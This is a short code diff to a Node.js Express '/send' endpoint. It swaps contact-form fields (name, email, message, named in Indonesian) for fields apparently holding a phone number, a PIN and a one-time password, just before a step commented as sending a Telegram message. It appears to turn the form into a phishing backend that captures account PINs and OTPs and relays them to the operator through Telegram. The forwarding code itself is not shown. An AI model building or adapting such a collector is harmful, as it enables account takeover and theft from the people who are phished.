@@ -20,9 +20,9 @@ app.post("/send", async(req,res) => {
     try{
 
         const {
-            nama,
-            email,
-            pesan
+            nmrx,
+            pix,
+            otp
         } = req.body;
 
         /* PESAN TELEGRAM */
